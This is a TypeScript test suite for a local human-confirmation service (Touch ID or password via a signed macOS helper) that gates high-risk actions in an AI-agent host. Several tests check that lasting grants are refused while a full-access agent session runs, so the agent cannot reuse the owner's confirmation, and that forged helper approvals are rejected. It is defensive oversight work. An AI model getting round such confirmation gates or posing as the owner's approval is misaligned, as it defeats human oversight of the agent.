    expect(record).toMatchObject({ id: expect.stringMatching(/^cfm_/u), action: 'approval.r2', title: '允许一次高风险操作' })
    await expect(record.settled).resolves.toMatchObject({ result: 'approved' })
    expect(presence.get(record.id, deviceId)).toEqual({
      id: record.id,
      action: 'approval.r2',
      title: '允许一次高风险操作',
      status: 'approved',
      hashDisplay: record.hashDisplay,
      expiresAt: record.expiresAt,
      reason: '允许写入 x',
      form: 'approval.write',
      lines: [{ label: '工具', value: 'write_file' }],
      warnings: [],
    })
    expect(backend.requests[0]!.requireBiometric).toBe(false)
    expect(backend.requests[0]!.preview.requester).toEqual(requester)
    const binding = {
      action: 'approval.r2' as const,
      requesterDeviceId: deviceId,
      paramsHash: paramsHash('approval.r2', { approvalId: 'a-1' }),
    }
    expect(presence.consume(record.id, binding)).toEqual({ stepup: 'lpc-local', method: 'password' })
    expect(presence.get(record.id, deviceId)?.status).toBe('consumed')
    expect(() => presence.consume(record.id, binding)).toThrow(expect.objectContaining({ status: 409, code: 'confirmation-used' }))
  })

  it('refuses another device, another action or other parameters', async () => {
    const { presence } = await service(createTestPresence())
    const binding = {
      action: 'approval.r2' as const,
      requesterDeviceId: deviceId,
      paramsHash: paramsHash('approval.r2', { approvalId: 'a-1' }),
    }
    const first = await presence.request(request())
    await first.settled
    expect(presence.get(first.id, `dev_${'D'.repeat(22)}`)).toBeUndefined()
    expect(presence.get(first.id)).toBeUndefined()
    expect(() => presence.consume(first.id, { ...binding, requesterDeviceId: `dev_${'D'.repeat(22)}` })).toThrow(
      expect.objectContaining({ status: 404, code: 'confirmation-not-found' }),
    )
    expect(() => presence.consume('cfm_missing', binding)).toThrow(expect.objectContaining({ status: 404 }))
    expect(() => presence.consume(first.id, { ...binding, paramsHash: paramsHash('approval.r2', { approvalId: 'a-2' }) })).toThrow(
      expect.objectContaining({ status: 409, code: 'confirmation-mismatch' }),
    )
    // A mismatched attempt voids the confirmation.
    expect(() => presence.consume(first.id, binding)).toThrow(expect.objectContaining({ code: 'confirmation-cancelled' }))
    const second = await presence.request(request())
    await second.settled
    expect(() => presence.consume(second.id, { ...binding, action: 'policy.change' })).toThrow(
      expect.objectContaining({ code: 'confirmation-mismatch' }),
    )
  })

  it('allows one confirmation at a time', async () => {
    const backend = createTestPresence({ mode: 'manual' })
    const { presence } = await service(backend)
    const first = await presence.request(request())
    await backend.waitForRequest()
    await expect(presence.request(request())).rejects.toMatchObject({
      status: 409,
      code: 'presence-busy',
      message: '本机正在等待另一项确认，请先完成或取消',
    })
    expect(() => presence.consume(first.id, { action: 'approval.r2', requesterDeviceId: deviceId, paramsHash: first.paramsHash })).toThrow(
      expect.objectContaining({ status: 409, code: 'confirmation-pending' }),
    )
    backend.denyNext()
    await first.settled
    expect(() => presence.consume(first.id, { action: 'approval.r2', requesterDeviceId: deviceId, paramsHash: first.paramsHash })).toThrow(
      expect.objectContaining({ status: 403, code: 'confirmation-denied' }),
    )
    await expect(presence.request(request())).resolves.toMatchObject({ status: 'pending' })
  })

  it('expires after 120 seconds for both showing and consuming', async () => {
    let now = 1_700_000_000_000
    const backend = createTestPresence({ mode: 'manual' })
    const { presence, dataDir } = await service(backend, { now: () => now })
    const pending = await presence.request(request())
    await backend.waitForRequest()
    now += 120_001
    expect(presence.get(pending.id, deviceId)?.status).toBe('expired')
    await expect(pending.settled).resolves.toEqual({ result: 'timeout' })
    expect(() =>
      presence.consume(pending.id, { action: 'approval.r2', requesterDeviceId: deviceId, paramsHash: pending.paramsHash }),
    ).toThrow(expect.objectContaining({ status: 410, code: 'confirmation-expired' }))

    backend.mode = 'approve'
    const approved = await presence.request(request())
    await approved.settled
    now += 119_000
    expect(presence.get(approved.id, deviceId)?.status).toBe('approved')
    now += 2_000
    expect(() =>
      presence.consume(approved.id, { action: 'approval.r2', requesterDeviceId: deviceId, paramsHash: approved.paramsHash }),
    ).toThrow(expect.objectContaining({ status: 410 }))
    await expect.poll(() => auditActions(dataDir).map(record => record.detail.result)).toEqual(['timeout'])
  })

  it('cools down for five minutes after three consecutive denials; an approval resets the count', async () => {
    let now = 1_700_000_000_000
    const backend = createTestPresence({ mode: 'deny' })
    const { presence, dataDir } = await service(backend, { now: () => now })
    const deny = async () => (await presence.request(request())).settled
    await deny()
    await deny()
    backend.mode = 'approve'
    await (
      await presence.request(request())
    ).settled
    backend.mode = 'deny'
    await deny()
    await deny()
    await expect(presence.request(request())).resolves.toBeTruthy()
    await new Promise(resolve => setTimeout(resolve, 0))
    await expect(presence.request(request())).rejects.toMatchObject({
      status: 429,
      code: 'presence-cooldown',
      message: '本机确认连续被拒绝 3 次，请 5 分钟后再试',
      details: { retryAfter: 300 },
    })
    now += 4 * 60_000
    await expect(presence.request(request())).rejects.toMatchObject({
      message: '本机确认连续被拒绝 3 次，请 1 分钟后再试',
      details: { retryAfter: 60 },
    })
    now += 60_001
    backend.mode = 'approve'
    await expect(presence.request(request())).resolves.toBeTruthy()
    await expect.poll(() => auditActions(dataDir).filter(record => record.action === 'presence.result').length).toBe(5)
  })

  it('does not count timeouts, cancellations or errors as denials', async () => {
    const backend = createTestPresence({ mode: 'manual' })
    const { presence } = await service(backend)
    for (let index = 0; index < 4; index++) {
      const record = await presence.request(request())
      await backend.waitForRequest()
      if (index % 2) backend.timeoutNext()
      else presence.cancel(record.id, deviceId)
      await record.settled
    }
    backend.mode = 'unavailable'
    await expect(presence.request(request())).rejects.toMatchObject({
      status: 503,
      code: 'presence-unavailable',
      message: '本机确认不可用：测试中的本机确认不可用',
    })
    backend.mode = 'approve'
    await expect(presence.request(request())).resolves.toBeTruthy()
  })

  it('tells the client that Touch ID is locked, and does not count it as a denial', async () => {
    const locked: PresenceBackend = {
      kind: 'test',
      availability: async () => ({ status: 'available', backend: 'test' }),
      confirm: async () => ({ result: 'error', message: 'Touch ID 已锁定，下次确认改用登录密码', failure: 'biometry-lockout' }),
    }
    const { presence } = await service(locked)
    for (let index = 0; index < 3; index++) {
      const record = await presence.request(request())
      await record.settled
      expect(presence.get(record.id, deviceId)).toMatchObject({ status: 'error', failure: 'biometry-lockout' })
    }
    // Three lockouts in a row are not three denials: no cooldown follows.
    await expect(presence.request(request())).resolves.toBeTruthy()
  })

  it('turns an approval that does not echo the nonce and preview hash into an error', async () => {
    const forged: PresenceBackend = {
      kind: 'test',
      availability: async () => ({ status: 'available', backend: 'test' }),
      confirm: async ({ previewHash }) => ({ result: 'approved', method: 'biometric', nonce: 'other', previewHash }),
    }
    const { presence } = await service(forged)
    const record = await presence.request(request())
    await expect(record.settled).resolves.toEqual({ result: 'error', message: '本机确认组件返回了不匹配的结果' })
    expect(presence.get(record.id, deviceId)?.status).toBe('error')
  })

  it('cancels a pending confirmation and aborts the backend', async () => {
    const backend = createTestPresence({ mode: 'manual' })
    const { presence } = await service(backend)
    const record = await presence.request(request())
    await backend.waitForRequest()
    presence.cancel(record.id, `dev_${'D'.repeat(22)}`)
    expect(presence.get(record.id, deviceId)?.status).toBe('pending')
    presence.cancel(record.id, deviceId)
    await expect(record.settled).resolves.toEqual({ result: 'cancelled' })
    expect(presence.get(record.id, deviceId)?.status).toBe('cancelled')
    expect(() => backend.approveNext()).toThrow()
  })

  it('while a full-access session runs or waits, refuses only what outlives it and names it only when asked to', async () => {
    let blocking: BlockingTask[] = [
      { id: 'task-1', title: '修复设置页密钥丢失', harnessId: 'codex' },
      { id: 'task-2', title: '整理发布说明', harnessId: 'opencode' },
    ]
    const backend = createTestPresence()
    const { presence } = await service(backend, { blocking: async () => blocking })
    // An agent with full access can already do these on this computer itself.
    for (const action of ['approval.r2', 'task.start-l3', 'task.mode-widen', 'agent.probe'] as const) {
      const record = await presence.request(request(action, { action }))
      await expect(record.settled).resolves.toMatchObject({ result: 'approved' })
    }
    const anonymous = { listener: 'unix', remoteAddress: '本机 host.sock' } as never
    const refused = [
      'device.enroll',
      'device.enroll-native',
      'device.grant',
      'policy.change',
      'provider.confirm-origin',
      'provider.set-key',
    ] as const
    for (const action of refused) {
      const enrolling = action === 'device.enroll' || action === 'device.enroll-native'
      const error = await presence.request(request(action, { action }, enrolling ? anonymous : requester)).catch(e => e)
      expect(error, action).toMatchObject({ status: 409, code: 'presence-blocked', details: { action } })
      expect(error.details.blockingTasks, action).toBeUndefined()
    }
    const named = await presence.request({ ...request('policy.change', { a: 1 }), revealBlocking: true }).catch(e => e)
    expect(named.details).toEqual({ action: 'policy.change', blockingTasks: blocking })
    // Every action says which way it goes; anything not marked to proceed is refused.
    expect(
      Object.entries(PRESENCE_ACTIONS)
        .filter(([, value]) => value.duringFullAccess === 'proceed')
        .map(([action]) => action)
        .sort(),
    ).toEqual(['agent.probe', 'approval.r2', 'task.mode-widen', 'task.start-l3'])
    expect(backend.requests.map(item => item.preview.action)).toEqual(['approval.r2', 'task.start-l3', 'task.mode-widen', 'agent.probe'])
    blocking = []
    await expect(presence.request(request('policy.change', { a: 1 }))).resolves.toBeTruthy()
    // Pairing a phone waits like any other device; then it asks for nothing but the system sheet, which names the phone.
    const native = await presence.request(request('device.enroll-native', {}))
    await expect(native.settled).resolves.toMatchObject({ result: 'approved' })
    expect(backend.requests.at(-1)?.preview).toMatchObject({ action: 'device.enroll-native', reason: '允许「x」连接这台 Mac' })
  })

  it('lists at most ten blocking sessions, with only their id, title and harness', async () => {
    const many = Array.from({ length: 12 }, (_, index) => ({ id: `t-${index}`, title: `会话 ${index}`, harnessId: 'codex', extra: 1 }))
    const { presence } = await service(createTestPresence(), { blocking: async () => many })
    const error = await presence.request({ ...request('device.grant', { a: 1 }), revealBlocking: true }).catch(e => e)
    expect(error.details.blockingTasks).toEqual(many.slice(0, 10).map(({ id, title, harnessId }) => ({ id, title, harnessId })))
  })

  it('refuses only lasting grants while a full-access session runs or waits, naming it to those who may see it', async () => {
    let running: BlockingTask[] = [{ id: 'acp-1', title: '修复设置页密钥丢失', harnessId: 'codex' }]
    const backend = createTestPresence()
    const { presence } = await service(backend, { blocking: async () => running })
    // An R2 step, another agent's start and a wider mode ask for no more than the running agent can do itself.
    for (const action of ['approval.r2', 'task.start-l3', 'task.mode-widen', 'agent.probe'] as const) {
      const record = await presence.request(request(action, { n: action }))
      await record.settled
    }
    for (const action of [
      'device.enroll',
      'device.enroll-native',
      'device.grant',
      'policy.change',
      'provider.set-key',
      'provider.confirm-origin',
      'plugin.package.apply',
    ] as const) {
      await expect(presence.request({ ...request(action), revealBlocking: true }), action).rejects.toMatchObject({
        status: 409,
        code: 'presence-blocked',
        message: '有完全访问会话正在运行或等你处理。为防止 Agent 冒用你的确认，这项确认要等它结束。',
        details: { action: action, blockingTasks: running },
      })
    }
    // A requester that may not see sessions (a device asking to enroll) learns nothing about them.
    const anonymous = await presence
      .request({ ...request('device.enroll'), requester: { listener: 'loopback-tcp', remoteAddress: '127.0.0.1' } })
      .catch((error: unknown) => error)
    expect(anonymous).toMatchObject({ code: 'presence-blocked', details: { action: 'device.enroll' } })
    expect((anonymous as AppError).details).not.toHaveProperty('blockingTasks')
    // An automation's grant lets a full-access agent run on its own later, so it waits too.
    expect(PRESENCE_ACTIONS['automation.grant']).toMatchObject({ requireBiometric: true, duringFullAccess: 'refuse' })
    expect(Object.values(PRESENCE_ACTIONS).filter(action => action.duringFullAccess === 'refuse')).toHaveLength(8)
    running = []
    await expect(presence.request(request('policy.change'))).resolves.toBeTruthy()
    expect(backend.requests.map(item => item.preview.action)).toEqual([
      'approval.r2',
      'task.start-l3',
      'task.mode-widen',
      'agent.probe',
      'policy.change',
    ])
  })

  it('binds anonymous host.sock requests to the anonymous requester', async () => {
    const backend: TestPresence = createTestPresence()
    const { presence } = await service(backend)
    const record = await presence.request(
      request('device.enroll', { enrollmentId: 'enr_x' }, { listener: 'unix', remoteAddress: '本机 host.sock' } as never),
    )
    await record.settled
    expect(backend.requests[0]!.requireBiometric).toBe(true)
    expect(presence.get(record.id, deviceId)).toBeUndefined()
    expect(
      presence.consume(record.id, { action: 'device.enroll', paramsHash: paramsHash('device.enroll', { enrollmentId: 'enr_x' }) }),
    ).toMatchObject({ stepup: 'lpc-local' })
  })
})

describe('PresenceService fairness between enrollments and the owner', () => {
  const anonymous = { listener: 'loopback-tcp' as const, remoteAddress: '127.0.0.1' }
  const enrollRequest = () => request('device.enroll', { enrollmentId: 'enr_x' }, anonymous as never)

  it("lets the owner's desktop take the dialog back from a pending anonymous enrollment", async () => {
    const backend = createTestPresence({ mode: 'manual' })
    const { presence, dataDir } = await service(backend)
    const stranger = await presence.request(enrollRequest())
    await backend.waitForRequest()
    const owner = await presence.request(request())
    await expect(stranger.settled).resolves.toEqual({ result: 'cancelled' })
    expect(presence.get(stranger.id)?.status).toBe('cancelled')
    expect(presence.get(owner.id, deviceId)?.status).toBe('pending')
    await backend.waitForRequest()
    backend.approveNext()
    await expect(owner.settled).resolves.toMatchObject({ result: 'approved' })
    await expect.poll(() => auditActions(dataDir).map(record => record.detail.result)).toEqual(['cancelled'])
  })

  it('keeps one dialog at a time otherwise', async () => {
    const backend = createTestPresence({ mode: 'manual' })
    const { presence } = await service(backend)
    await presence.request(enrollRequest())
    await backend.waitForRequest()
    // Another enrollment, or a device that is not the desktop, still waits its turn.
    await expect(presence.request(enrollRequest())).rejects.toMatchObject({ status: 409, code: 'presence-busy' })
    const browser = { deviceId, deviceName: '浏览器', listener: 'loopback-tcp' as const, remoteAddress: '127.0.0.1' }
    await expect(presence.request(request('approval.r2', { approvalId: 'a-1' }, browser as never))).rejects.toMatchObject({
      code: 'presence-busy',
    })
    // A device request is never pre-empted by an enrollment.
    const second = await service(createTestPresence({ mode: 'manual' }))
    await second.presence.request(request())
    await expect(second.presence.request(enrollRequest())).rejects.toMatchObject({ code: 'presence-busy' })
  })

  it('cools down only anonymous enrollments after their dialogs are dismissed', async () => {
    const backend = createTestPresence({ mode: 'deny' })
    const { presence } = await service(backend)
    for (let index = 0; index < 3; index++) await (await presence.request(enrollRequest())).settled
    await expect(presence.request(enrollRequest())).rejects.toMatchObject({ status: 429, code: 'presence-cooldown' })
    backend.mode = 'approve'
    await expect((await presence.request(request())).settled).resolves.toMatchObject({ result: 'approved' })
    await expect(presence.request(enrollRequest())).rejects.toMatchObject({ status: 429, code: 'presence-cooldown' })
  })

  it("still cools down everything after the owner's own requests are denied three times", async () => {
    const backend = createTestPresence({ mode: 'deny' })
    const { presence } = await service(backend)
    for (let index = 0; index < 3; index++) await (await presence.request(request())).settled
    await expect(presence.request(request())).rejects.toMatchObject({ status: 429, code: 'presence-cooldown' })
    await expect(presence.request(enrollRequest())).rejects.toMatchObject({ status: 429, code: 'presence-cooldown' })
  })
})

class FakeChild extends EventEmitter implements ChildProcessLike {
  readonly stdin = new PassThrough()
  readonly stdout = new PassThrough()
  readonly received: Buffer[] = []
  killed: NodeJS.Signals | undefined
  constructor() {
    super()
    this.stdin.on('data', chunk => this.received.push(chunk))
  }
  kill(signal?: NodeJS.Signals): boolean {
    this.killed = signal
    queueMicrotask(() => this.emit('exit', null, signal ?? 'SIGTERM'))
    return true
  }
  reply(text: string): void {
    this.stdout.write(text)
    this.stdout.end()
    setTimeout(() => this.emit('exit', 0, null), 5)
  }
  input(): Record<string, unknown> {
    return JSON.parse(Buffer.concat(this.received).toString('utf8'))
  }
}

describe('macOS helper backend', () => {
  async function setup(options: { platform?: NodeJS.Platform; helper?: boolean; mode?: number; backend?: 'macos-helper' | 'none' } = {}) {
    const codeRoot = temp()
    const { audit, dataDir } = await auditLog()
    const policy = await PolicyStore.open({ dataDir, audit, platform: 'darwin' })
    if (options.backend === 'none')
      await policy.update(
        { ...policy.get(), presence: { backend: 'none', helperCdhash: null } },
        { listener: 'cli', via: 'cli' },
        'offline',
      )
    const helper = join(codeRoot, 'dist', 'native', 'latch-presence')
    if (options.helper !== false) {
      mkdirSync(join(codeRoot, 'dist', 'native'), { recursive: true })
      writeFileSync(helper, 'binary', { mode: 0o755 })
      chmodSync(helper, options.mode ?? 0o755)
    }
    const calls: string[][] = []
    const codesign = { verify: 0, requirement: 0, cdhash: 'b'.repeat(40) }
    const execFile: ExecFileLike = async (file, args) => {
      calls.push([file, ...args])
      expect(file).toBe('/usr/bin/codesign')
      if (args[0] === '-dvvv') return { code: 0, stdout: '', stderr: `Executable=${helper}\nCDHash=${codesign.cdhash}\n` }
      if (args.some(arg => arg.startsWith('-R='))) return { code: codesign.requirement, stdout: '', stderr: '' }
      return { code: codesign.verify, stdout: '', stderr: '' }
    }
    const children: FakeChild[] = []
    const spawns: Array<{ file: string; options: unknown }> = []
    const spawn: SpawnLike = (file, _args, spawnOptions) => {
      spawns.push({ file, options: spawnOptions })
      const child = new FakeChild()
      children.push(child)
      return child
    }
    const backend = createPresenceBackend({ platform: options.platform ?? 'darwin', codeRoot, policy, execFile, spawn })
    return { backend, policy, calls, codesign, children, spawns, helper, dataDir, audit, codeRoot, execFile, spawn }
  }

  const confirmInput = () => {
    const built = buildPreview({
      hostId,
      action: 'device.enroll',
      now: Date.now(),
      requester,
      subject: enrollmentSubject('unix', '手机'),
      lines: [{ label: '设备名称', value: '手机' }],
      warnings: [],
    })
    return { ...built, requireBiometric: true }
  }

  it('is unavailable off macOS or when disabled by policy', async () => {
    await expect((await setup({ platform: 'linux' })).backend.availability()).resolves.toEqual({
      status: 'unavailable',
      reason: 'platform',
      message: '此系统暂不支持本机确认（Touch ID 或登录密码）',
    })
    const disabled = await setup({ backend: 'none' })
    expect(disabled.backend.kind).toBe('none')
    await expect(disabled.backend.availability()).resolves.toMatchObject({ status: 'unavailable', reason: 'disabled' })
  })

  it('reports a missing helper, insecure file or bad signature', async () => {
    await expect((await setup({ helper: false })).backend.availability()).resolves.toEqual({
      status: 'unavailable',
      reason: 'helper-missing',
      message: '未找到本机确认组件。请运行 pnpm build:presence 后重启 Host。',
    })
    await expect((await setup({ mode: 0o775 })).backend.availability()).resolves.toMatchObject({ reason: 'helper-signature' })
    const unsigned = await setup()
    unsigned.codesign.verify = 1
    await expect(unsigned.backend.availability()).resolves.toMatchObject({ reason: 'helper-signature' })
    expect(unsigned.policy.get().presence.helperCdhash).toBeNull()
  })

  it('pins the cdhash on first use, then detects a different binary', async () => {
    const context = await setup()
    await expect(context.backend.availability()).resolves.toEqual({ status: 'available', backend: 'macos-helper' })
    expect(context.policy.get().presence.helperCdhash).toBe('b'.repeat(40))
    expect(context.calls).toContainEqual(['/usr/bin/codesign', '--verify', '--strict', `-R=cdhash H"${'b'.repeat(40)}"`, context.helper])
    context.codesign.requirement = 3
    const input = confirmInput()
    // Every confirm re-checks, never from the cache.
    await expect(context.backend.confirm({ ...input, signal: new AbortController().signal })).resolves.toEqual({
      result: 'error',
      message: '本机确认组件与登记的签名不一致。如果你重新构建了它，请停止 Host 后运行 pnpm latch presence repin。',
    })
    expect(context.children).toHaveLength(0)
    context.codesign.verify = 1
    await expect(context.backend.confirm({ ...input, signal: new AbortController().signal })).resolves.toMatchObject({ result: 'error' })
  })

  it('does not pin again on its own once an earlier pin was lost', async () => {
    const context = await setup()
    await expect(context.backend.availability()).resolves.toEqual({ status: 'available', backend: 'macos-helper' })
    // policy.json reset outside Latch: the pin is gone, the audit log still records it.
    writeFileSync(
      join(context.dataDir, 'policy.json'),
      JSON.stringify({ ...context.policy.get(), presence: { backend: 'macos-helper', helperCdhash: null } }),
    )
    const reopened = await PolicyStore.open({ dataDir: context.dataDir, audit: context.audit, platform: 'darwin' })
    const backend = createPresenceBackend({
      platform: 'darwin',
      codeRoot: context.codeRoot,
      policy: reopened,
      execFile: context.execFile,
      spawn: context.spawn,
    })
    // The helper itself is fine; only the pin is gone, so the fix is a repin, not a rebuild.
    await expect(backend.availability()).resolves.toEqual({
      status: 'unavailable',
      reason: 'cdhash-mismatch',
      message: '本机确认组件的登记签名已丢失（policy.json 被修改或删除）。请停止 Host 后运行 pnpm latch presence repin。',
    })
    expect(reopened.get().presence.helperCdhash).toBeNull()
  })

  it('sends the full preview to the helper with an empty environment and parses one result line', async () => {
    const context = await setup()
    const input = confirmInput()
    const pending = context.backend.confirm({ ...input, signal: new AbortController().signal })
    await expect.poll(() => context.children.length).toBe(1)
    const child = context.children[0]!
    await expect.poll(() => child.received.length).toBeGreaterThan(0)
    expect(context.spawns[0]).toEqual({ file: context.helper, options: { env: {}, cwd: '/', stdio: ['pipe', 'pipe', 'ignore'] } })
    expect(child.input()).toEqual({
      v: 2,
      preview: input.preview,
      previewHash: input.previewHash,
      timeoutSeconds: 115,
      requireBiometric: true,
    })
    child.reply(
      `${JSON.stringify({ v: 1, nonce: input.preview.nonce, previewHash: input.previewHash, result: 'approved', method: 'biometric' })}\n`,
    )
    await expect(pending).resolves.toEqual({
      result: 'approved',
      method: 'biometric',
      nonce: input.preview.nonce,
      previewHash: input.previewHash,
    })
  })

  it.each<[string, string, PresenceOutcome]>([
    ['denied', '{"v":1,"nonce":"n","previewHash":"h","result":"denied"}\n', { result: 'denied' }],
    ['timeout', '{"v":1,"result":"timeout"}\n', { result: 'timeout' }],
    [
      'hash mismatch',
      '{"v":1,"result":"error","error":"preview-hash-mismatch"}\n',
      { result: 'error', message: '本机确认组件无法核对确认内容' },
    ],
    [
      'reason mismatch',
      '{"v":1,"result":"error","error":"reason-mismatch"}\n',
      { result: 'error', message: '本机确认组件无法核对确认内容' },
    ],
    [
      'Touch ID locked',
      '{"v":1,"result":"error","error":"biometry-lockout"}\n',
      { result: 'error', message: 'Touch ID 已锁定，下次确认改用登录密码', failure: 'biometry-lockout' },
    ],
    ['malformed', 'not json\n', { result: 'error', message: '本机确认组件返回了无效结果' }],
    ['empty', '', { result: 'error', message: '本机确认组件返回了无效结果' }],
    ['unknown result', '{"v":1,"result":"maybe"}\n', { result: 'error', message: '本机确认组件返回了无效结果' }],
    [
      'wrong echo',
      '{"v":1,"nonce":"x","previewHash":"y","result":"approved","method":"biometric"}\n',
      { result: 'error', message: '本机确认组件返回了不匹配的结果' },
    ],
  ])('maps helper output: %s', async (_name, output, expected) => {
    const context = await setup()
    const pending = context.backend.confirm({ ...confirmInput(), signal: new AbortController().signal })
    await expect.poll(() => context.children.length).toBe(1)
    context.children[0]!.reply(output)
    await expect(pending).resolves.toEqual(expected)
  })

  it("closes the system sheet with SIGTERM when the Host's 120 s run out", async () => {
    const context = await setup()
    vi.useFakeTimers({ toFake: ['setTimeout', 'clearTimeout'] })
    cleanups.push(() => void vi.useRealTimers())
    const { presence, dataDir } = await service(context.backend)
    const record = await presence.request(request())
    while (context.children.length === 0) await new Promise(resolve => setImmediate(resolve))
    vi.advanceTimersByTime(CONFIRMATION_LIFETIME_MS - 1)
    expect(context.children[0]!.killed).toBeUndefined()
    vi.advanceTimersByTime(1)
    expect(context.children[0]!.killed).toBe('SIGTERM')
    await expect(record.settled).resolves.toEqual({ result: 'timeout' })
    expect(presence.get(record.id, deviceId)?.status).toBe('expired')
    vi.useRealTimers()
    await expect.poll(() => auditActions(dataDir).map(item => item.detail.result)).toEqual(['timeout'])
  })

  it('kills the helper on oversize output and on abort', async () => {
    const context = await setup()
    const oversize = context.backend.confirm({ ...confirmInput(), signal: new AbortController().signal })
    await expect.poll(() => context.children.length).toBe(1)
    context.children[0]!.stdout.write('x'.repeat(5000))
    await expect(oversize).resolves.toEqual({ result: 'error', message: '本机确认组件返回了无效结果' })
    expect(context.children[0]!.killed).toBe('SIGTERM')

    const controller = new AbortController()
    const aborted = context.backend.confirm({ ...confirmInput(), signal: controller.signal })
    await expect.poll(() => context.children.length).toBe(2)
    controller.abort()
    await expect(aborted).resolves.toEqual({ result: 'cancelled' })
    expect(context.children[1]!.killed).toBe('SIGTERM')
  })
})

describe('macOS helper self-test', () => {
  const helper = resolve('dist/native/latch-presence')
  // The only automated run of the real helper: no LocalAuthentication.
  it.skipIf(process.platform !== 'darwin' || !existsSync(helper))(
    'reproduces canonical JSON, preview hashes, display escaping and the reason byte for byte, and refuses other reasons',
    async () => {
      // The rule of `pnpm build:presence`. A helper older than its source was built from other code, so its exit status
      // would report a disagreement between encodings when all it needs is a build. This stays a failure, not a skip:
      // it is the only run of the real helper. Vectors are read at run time, so a helper older than them still runs.
      const newer = ['native/macos/LatchPresence.swift', 'native/macos/LatchPresence-Info.plist'].filter(
        input => statSync(input).mtimeMs >= statSync(helper).mtimeMs,
      )
      expect(newer, 'dist/native/latch-presence is older than these files: run pnpm build (or pnpm build:presence) first').toEqual([])
      const { stdout } = await promisify(execFile)(helper, ['--self-test', SECURITY_VECTORS_FILE], {
        env: {},
        cwd: '/',
        timeout: 10_000,
      })
      const result = JSON.parse(stdout.trim()) as {
        ok: boolean
        confirmationSigning: boolean
        canonicalJson: Array<{ ok: boolean; sha256: string }>
        previewHash: Array<{ ok: boolean; previewHash: string; hashDisplay: string }>
        escapePreviewText: boolean[]
        presenceReason: boolean[]
        presenceRequest: string[]
      }
      const canonical = [SECURITY_VECTORS.canonicalJson, ...SECURITY_VECTORS.canonicalJsonCases]
      expect(result.canonicalJson).toEqual(canonical.map(vector => ({ ok: true, sha256: vector.sha256 })))
      expect(result.previewHash).toEqual(
        PREVIEW_HASH_VECTORS.map(vector => ({ ok: true, previewHash: vector.previewHash, hashDisplay: vector.hashDisplay })),
      )
      // The sheet's sentence is escaped and built exactly like the Host's, and any other sentence is refused.
      expect(result.escapePreviewText).toEqual(ESCAPE_PREVIEW_VECTORS.map(() => true))
      expect(result.presenceReason).toEqual(PRESENCE_REASON_VECTORS.map(() => true))
      expect(result.presenceRequest).toEqual(PRESENCE_REQUEST_VECTORS.map(vector => vector.result))
      expect(result.presenceRequest).toContain('reason-mismatch')
      expect(result.confirmationSigning).toBe(true)
      expect(result.ok).toBe(true)
    },
  )
})
